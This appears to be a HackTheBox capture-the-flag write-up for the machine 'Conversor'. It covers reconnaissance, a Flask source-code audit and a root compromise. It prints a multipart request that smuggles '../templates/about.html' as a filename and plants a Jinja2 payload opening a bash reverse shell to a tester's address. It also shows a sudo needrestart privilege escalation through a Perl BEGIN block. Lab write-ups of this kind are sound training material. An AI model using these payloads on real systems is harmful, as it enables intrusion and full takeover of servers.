---
title: Conversor - HackTheBox WriteUp
description: This write-up for the retired machine Conversor was completed while the machine was still active on the HackTheBox platform. Publication was held until after its official retirement to comply with platform guidelines.
author: ZoldyckSec
date: 2026-01-05 00:00:00 -0800
categories: [HackTheBox]
tags: [Conversor, Linux, Path-transversal, SSTI, sqlite]
render_with_liquid: false
published: false
---
## Description:

- `Date` January
- `Machine` Conversor (Linux)
- `Difficulty` Easy
- `Prepared by` Allan Espinoza(Aka.ZoldyckSec)

## Summary

This machine is a great lesson in why developers should not only protect against a format's most well-known vulnerabilities (such as XXE in XML), but also sanitize basic user input. We will move from a black box analysis to a source code audit (White-Box), forge an attack chain combining **Path Traversal** and **Server-Side Template Injection (SSTI)**.

## Reconnaissance

#### Port Scanning

```bash
nmap -p- --open -sS --min-rate 5555 -vvv -n -Pn -oG 10.129.5.167 allPorts 
```
The scan reveals two open ports:

- Port 22: SSH
- Port 80: HTTP 

#### Service and Versions

```bash
nmap -p22,80 -sCV 10.129.5.167 -oN targeted
```
```markdown
  PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
 |   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
 |_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
 80/tcp open  http    Apache httpd 2.4.52
 |_http-title: Did not follow redirect to http://conversor.htb/
 |_http-server-header: Apache/2.4.52 (Ubuntu)
 Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
> Domain: conversor.htb

#### Web Application Analysis

Web application on port 80 reveals a login interface:

![Desktop View](/assets/img/Conversor/webconversor.png){: width="972" height="589" }
_Full screen width and center alignment_

After registering and signing in, I was redirected to the app’s main interface

![Desktop View](/assets/img/Conversor/template.png){: width="972" height="589" }


> The page allow users to upload two files: an `XML File` and an `XSLT File`
-  `XML File:` XML (Extensible Markup Language) is a text-based file format used to store, transmit, and reconstruct data in a way that is both human-readable and machine-readable.
- `XSLT File:`  XSLT file (with the .xslt extension) is a stylesheet used to transform XML documents into other formats such as HTML, plain text, PDF, or other XML structures. 

#### Tecnologies Identified

```markdown
whatweb http://conversor.htb/
http://conversor.htb/ [302 Found] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.129.238.31], RedirectLocation[/login], Title[Redirecting...]
http://conversor.htb/login [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.129.238.31], PasswordField[password], Title[Login]
```

#### Source Code Analysis

While exploring the application, I navigated to the /about page and found a link to download the application's source code (source_code.tar.gz).

![Desktop View](/assets/img/Conversor/source.png){: width="972" height="589" }

Extracting and reviewing the code revealed that the backend is built with Python's Flask framework. My initial attempts to test for XXE (XML External Entity) injection failed, and looking at the app.py file explained why:

```markdown
parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
```
However, auditing the /convert endpoint (which handles the file uploads) revealed a critical Arbitrary File Write vulnerability via Path Traversal:

```python
@app.route('/convert', methods=['POST'])
def convert():
    # [...]
    xml_file = request.files['xml_file']
    xslt_file = request.files['xslt_file']

    # Vulnerable implementation
    xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)
    xml_file.save(xml_path)
```
> The developer trusts the user-provided filename and concatenates it directly using os.path.join without sanitizing it through Werkzeug's secure_filename() function

## Explotation

#### Path Traversal + SSTI

Knowing that Flask applications store their HTML templates in a /templates directory, we can combine the Path Traversal with a Server-Side Template Injection (SSTI) attack, I intercepted the upload request using Burp Suite and modified the xml_file filename to point to the about.html template. Instead of an XML file, I injected a Jinja2 payload designed to execute a reverse shell via Python's object introspection.

#### Malicious HTTP Request:

```markdown
POST /convert HTTP/1.1
Host: conversor.htb
Content-Type: multipart/form-data; boundary=----geckoformboundary
Connection: close

------geckoformboundary
Content-Disposition: form-data; name="xml_file"; filename="../templates/about.html"
Content-Type: text/html

<!DOCTYPE html>
<html>
<body>
    <h1>Pwned by ZoldyckSec</h1>
    {{ cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.14.X/443 0>&1"').read() }}
</body>
</html>
------geckoformboundary
Content-Disposition: form-data; name="xslt_file"; filename="dummy.xslt"
Content-Type: text/xml

<root></root>
------geckoformboundary--
```

After sending the request, the server successfully overwrote the file. To trigger the payload, I set up a Netcat listener (nc -lvnp 443) and simply navigated to http://conversor.htb/about. The server rendered our malicious template, executing the reverse shell and granting access as the www-data user.

## Lateral Movement

Once inside the machine, I enumerated the web directory and found a SQLite database file at /var/www/conversor.htb/instance/app.db

```bash
www-data@conversor:/var/www/conversor.htb/instance$ sqlite3 app.db "SELECT * FROM users;"
1|admin|admin@conversor.htb|[REDACTED]
2|fismathack|fismathack@conversor.htb|306822292f7dc29fa05f2f45cc18b871****
```
> We obtained the MD5 hash for the user fismathack. I cracked it locally using CrackStaion

> The password was cracked in seconds. I used these credentials to authenticate via SSH

## Privilege Escalation 

Checking the user's sudo privileges revealed an interesting entry:

```bash
fismathack@conversor:~$ sudo -l
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

We can run the /usr/sbin/needrestart utility as root without providing a password. needrestart is a tool written natively in Perl.

Instead of relying on unstable environment variable hijacking (like PYTHONPATH), we can exploit how needrestart parses its configuration files. In Perl, configuration files are often evaluated directly as source code. We can abuse this by creating a custom configuration file containing a BEGIN block.

A BEGIN block tells the Perl interpreter to execute the enclosed code immediately during the compilation phase, before the rest of the script even runs.

I crafted a malicious .conf file in the /tmp directory:

```bash
cat << 'EOF' > /tmp/exploit.conf
BEGIN { system("/bin/bash -p") }
%nrconf = (
    verbosity => 0,
    restart => 'a'
);
EOF
```
To execute the exploit, we leverage the -c flag, which forces needrestart to load our custom configuration file instead of the default one:

```bash
sudo /usr/sbin/needrestart -c /tmp/exploit.conf
```

The moment the command was executed, the Perl interpreter read the configuration, parsed the BEGIN block, and spawned a privileged bash shell as root.

```bash
root@conversor:~# id
uid=0(root) gid=0(root) groups=0(root)
root@conversor:~# cat /root/root.txt
[REDACTED]
```

